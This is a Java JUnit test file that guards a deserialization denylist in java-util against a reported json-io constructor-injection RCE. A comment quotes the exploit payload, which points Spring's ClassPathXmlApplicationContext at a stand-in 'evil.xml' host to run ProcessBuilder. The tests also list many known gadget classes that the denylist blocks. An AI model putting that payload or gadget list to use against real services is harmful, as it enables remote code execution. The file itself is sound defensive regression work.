package com.cedarsoftware.util;

import java.io.File;
import java.util.LinkedHashMap;
import java.util.Map;

import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Test;
import org.springframework.context.support.ClassPathXmlApplicationContext;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

/**
 * Regression coverage for the constructor-injection RCE reported against json-io 4.108.0, whose fix
 * lives here: json-io performs no security checks of its own and delegates every {@code @type}
 * instantiation to {@link ClassUtilities#newInstance}.
 * <p>
 * The report framed the defect as "the denylist is incomplete". It was worse than that — the denylist
 * was <b>not enforced at all</b> on the path the exploit used. {@code newInstance} routes a
 * {@code Map} of named arguments to {@code newInstanceWithNamedParameters}, which never called
 * {@code SecurityChecker.verifyClass()}; only the positional fallback did. So a class the checker
 * itself reported as blocked was constructed anyway, and merely adding
 * {@code ClassPathXmlApplicationContext} to the list would not have closed the reported PoC.
 * <p>
 * Both halves are pinned here: {@link #namedParameterPathEnforcesTheDenylist()} covers the
 * enforcement hole, the rest cover the list's new coverage.
 */
class ClassUtilitiesIndirectLoaderSecurityTest {

    @AfterEach
    void tearDown() {
        ClassUtilities.SecurityChecker.clearSecurityOverrides();
        ClassPathXmlApplicationContext.refreshed = null;
    }

    private static Map<String, Object> named(String key, Object value) {
        Map<String, Object> args = new LinkedHashMap<>();
        args.put(key, value);
        return args;
    }

    // ========== The enforcement hole: named parameters bypassed the gate entirely ==========

    /**
     * A {@link ClassLoader} subclass is blocked by the supertype walk — {@code isSecurityBlocked}
     * reported {@code true} for it even before this fix. Yet {@code newInstance} constructed it,
     * because the named-parameter path did not consult the checker. This is the core defect.
     */
    @Test
    void namedParameterPathEnforcesTheDenylist() {
        assertThat(ClassUtilities.SecurityChecker.isSecurityBlocked(EvilLoader.class)).isTrue();

        assertThatThrownBy(() -> ClassUtilities.newInstance(EvilLoader.class, named("marker", "pwned")))
                .isInstanceOf(SecurityException.class)
                .hasMessageContaining("EvilLoader");

        assertThat(EvilLoader.constructed).as("constructor must never have run").isFalse();
    }

    /** A blocked class must be refused whether the arguments arrive as a Map or positionally. */
    @Test
    void positionalPathStillEnforcesTheDenylist() {
        assertThatThrownBy(() -> ClassUtilities.newInstance(EvilLoader.class, "pwned"))
                .isInstanceOf(SecurityException.class);
        assertThat(EvilLoader.constructed).isFalse();
    }

    // ========== The reported gadget: an off-list indirect loader ==========

    /**
     * The reported payload, verbatim in shape:
     * {@code {"@type":"org.springframework.context.support.ClassPathXmlApplicationContext",
     * "configLocations":"http://127.0.0.1:8000/evil.xml"}}.
     * <p>
     * The varargs {@code String...} constructor is what made this reachable: the varargs branch of
     * named matching widens the single attacker string into a {@code String[1]}, so every parameter
     * matches and the constructor fires. In the real class that constructor calls {@code refresh()},
     * which loads the attacker's bean XML and instantiates {@code ProcessBuilder} with
     * {@code init-method="start"} — inside the Spring child context, beyond this gate's reach.
     */
    @Test
    void springApplicationContextIsRefused() {
        assertThatThrownBy(() -> ClassUtilities.newInstance(ClassPathXmlApplicationContext.class,
                named("configLocations", "http://127.0.0.1:8000/evil.xml")))
                .isInstanceOf(SecurityException.class)
                .hasMessageContaining("ClassPathXmlApplicationContext");

        assertThat(ClassPathXmlApplicationContext.refreshed)
                .as("constructor side effect (refresh()) must never have run")
                .isNull();
    }

    /**
     * The block is keyed on the {@code ApplicationContext} interface, not on the concrete class name,
     * so it covers {@code FileSystemXmlApplicationContext}, {@code GenericXmlApplicationContext},
     * {@code AnnotationConfigApplicationContext} and any other implementation — present or future —
     * without java-util enumerating them or depending on Spring.
     */
    @Test
    void blockCoversTheWholeApplicationContextFamily() {
        assertThat(ClassUtilities.SecurityChecker.isSecurityBlocked(ClassPathXmlApplicationContext.class))
                .as("blocked via the org.springframework.context.ApplicationContext supertype")
                .isTrue();
        assertThat(ClassUtilities.SecurityChecker.isSecurityBlocked(
                org.springframework.context.ApplicationContext.class)).isTrue();
    }

    // ========== The other off-list exits named in the report ==========

    /** {@code java.net.Socket}'s constructor opens a TCP connection: SSRF with no gadget on the classpath. */
    @Test
    void socketConstructionIsRefused() {
        Map<String, Object> args = new LinkedHashMap<>();
        args.put("host", "127.0.0.1");
        args.put("port", 9);
        assertThatThrownBy(() -> ClassUtilities.newInstance(java.net.Socket.class, args))
                .isInstanceOf(SecurityException.class);
    }

    /** {@code FileOutputStream}'s constructor creates or truncates an arbitrary file. */
    @Test
    void fileOutputStreamConstructionIsRefused() {
        File victim = new File(System.getProperty("java.io.tmpdir"), "java-util-cve-must-not-exist.txt");
        victim.delete();

        assertThatThrownBy(() -> ClassUtilities.newInstance(java.io.FileOutputStream.class,
                named("name", victim.getAbsolutePath())))
                .isInstanceOf(SecurityException.class);

        assertThat(victim).as("file must not have been created").doesNotExist();
    }

    @Test
    void otherIndirectLoaderFamiliesAreRefused() {
        // Constructors that reach the network, the filesystem, or a bytecode/gadget interpreter.
        assertThat(ClassUtilities.SecurityChecker.isSecurityBlocked(java.net.ServerSocket.class)).isTrue();
        assertThat(ClassUtilities.SecurityChecker.isSecurityBlocked(java.net.DatagramSocket.class)).isTrue();
        assertThat(ClassUtilities.SecurityChecker.isSecurityBlocked(java.io.FileWriter.class)).isTrue();
        assertThat(ClassUtilities.SecurityChecker.isSecurityBlocked(java.io.RandomAccessFile.class)).isTrue();
        assertThat(ClassUtilities.SecurityChecker.isSecurityBlocked(java.io.ObjectInputStream.class)).isTrue();

        // Blocked by name, so the check holds whether or not the class is loadable here.
        assertThat(ClassUtilities.SecurityChecker.isSecurityBlockedName("javax.naming.InitialContext")).isTrue();
        assertThat(ClassUtilities.SecurityChecker.isSecurityBlockedName("com.sun.rowset.JdbcRowSetImpl")).isTrue();
        assertThat(ClassUtilities.SecurityChecker.isSecurityBlockedName("javax.xml.transform.Templates")).isTrue();
        assertThat(ClassUtilities.SecurityChecker.isSecurityBlockedName(
                "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl")).isTrue();
        assertThat(ClassUtilities.SecurityChecker.isSecurityBlockedName("org.mozilla.javascript.Context")).isTrue();
        assertThat(ClassUtilities.SecurityChecker.isSecurityBlockedName("bsh.Interpreter")).isTrue();
        assertThat(ClassUtilities.SecurityChecker.isSecurityBlockedName("org.python.util.PythonInterpreter")).isTrue();
        assertThat(ClassUtilities.SecurityChecker.isSecurityBlockedName("groovy.lang.GroovyShell")).isTrue();
        assertThat(ClassUtilities.SecurityChecker.isSecurityBlockedName("java.rmi.registry.LocateRegistry")).isTrue();
        assertThat(ClassUtilities.SecurityChecker.isSecurityBlockedName(
                "javax.management.remote.rmi.RMIConnector")).isTrue();
    }

    /**
     * {@code verifyClass} previously applied only exact names and supertypes; the package prefixes
     * lived in {@code isSecurityBlockedName} and were consulted only when loading by name. A class
     * already in hand from a blocked package therefore passed.
     */
    @Test
    void verifyClassAppliesPackagePrefixesNotJustExactNames() {
        assertThat(ClassUtilities.SecurityChecker.isSecurityBlocked(javax.script.SimpleBindings.class))
                .as("javax.script. is a blocked package prefix; SimpleBindings is not listed by name")
                .isTrue();
    }

    // ========== Ordinary data classes must remain constructible ==========

    @Test
    void benignClassesAreUnaffected() {
        Object dto = ClassUtilities.newInstance(Dto.class, named("value", "hello"));
        assertThat(dto).isInstanceOf(Dto.class);
        assertThat(((Dto) dto).value).isEqualTo("hello");

        // Read-side file I/O is deliberately left constructible - opening a handle is not a
        // side effect on the order of spawning a process or writing a file.
        assertThat(ClassUtilities.SecurityChecker.isSecurityBlocked(java.io.FileInputStream.class)).isFalse();
        assertThat(ClassUtilities.SecurityChecker.isSecurityBlocked(java.io.FileReader.class)).isFalse();
        assertThat(ClassUtilities.SecurityChecker.isSecurityBlocked(String.class)).isFalse();
        assertThat(ClassUtilities.SecurityChecker.isSecurityBlocked(java.util.ArrayList.class)).isFalse();
    }

    // ========== The override API ==========

    @Test
    void addBlockedClassTakesEffectOnAClassAlreadyChecked() {
        assertThat(ClassUtilities.SecurityChecker.isSecurityBlocked(Dto.class)).isFalse();

        ClassUtilities.SecurityChecker.addBlockedClass(Dto.class.getName());

        assertThat(ClassUtilities.SecurityChecker.isSecurityBlocked(Dto.class))
                .as("runtime rules are consulted ahead of the ClassValue cache, so no invalidation is needed")
                .isTrue();
        assertThatThrownBy(() -> ClassUtilities.newInstance(Dto.class, named("value", "x")))
                .isInstanceOf(SecurityException.class);
    }

    @Test
    void addBlockedPackageCoversSubclassesViaSupertypeWalk() {
        ClassUtilities.SecurityChecker.addBlockedPackage("org.springframework.");
        assertThat(ClassUtilities.SecurityChecker.isSecurityBlocked(ClassPathXmlApplicationContext.class)).isTrue();
        assertThat(ClassUtilities.SecurityChecker.isSecurityBlockedName("org.springframework.anything.AtAll")).isTrue();
    }

    @Test
    void allowClassOverridesABuiltInBlock() {
        assertThat(ClassUtilities.SecurityChecker.isSecurityBlocked(java.io.FileWriter.class)).isTrue();

        ClassUtilities.SecurityChecker.allowClass("java.io.FileWriter");

        assertThat(ClassUtilities.SecurityChecker.isSecurityBlocked(java.io.FileWriter.class)).isFalse();
        assertThat(ClassUtilities.SecurityChecker.isSecurityBlockedName("java.io.FileWriter")).isFalse();
    }

    @Test
    void clearSecurityOverridesRestoresDefaults() {
        ClassUtilities.SecurityChecker.allowClass("java.io.FileWriter");
        ClassUtilities.SecurityChecker.addBlockedClass(Dto.class.getName());

        ClassUtilities.SecurityChecker.clearSecurityOverrides();

        assertThat(ClassUtilities.SecurityChecker.isSecurityBlocked(java.io.FileWriter.class)).isTrue();
        assertThat(ClassUtilities.SecurityChecker.isSecurityBlocked(Dto.class)).isFalse();
    }

    @Test
    void overrideApiRejectsBlankConfiguration() {
        assertThatThrownBy(() -> ClassUtilities.SecurityChecker.addBlockedClass(null))
                .isInstanceOf(IllegalArgumentException.class);
        assertThatThrownBy(() -> ClassUtilities.SecurityChecker.addBlockedPackage("   "))
                .as("an empty prefix would match every class name")
                .isInstanceOf(IllegalArgumentException.class);
        assertThatThrownBy(() -> ClassUtilities.SecurityChecker.allowClass(""))
                .isInstanceOf(IllegalArgumentException.class);
    }

    // ========== Fixtures ==========

    /** Blocked through its {@link ClassLoader} supertype, with a real reflective parameter name. */
    public static class EvilLoader extends ClassLoader {
        static boolean constructed;

        public EvilLoader(String marker) {
            constructed = true;
        }
    }

    public static class Dto {
        final String value;

        public Dto(String value) {
            this.value = value;
        }
    }
}
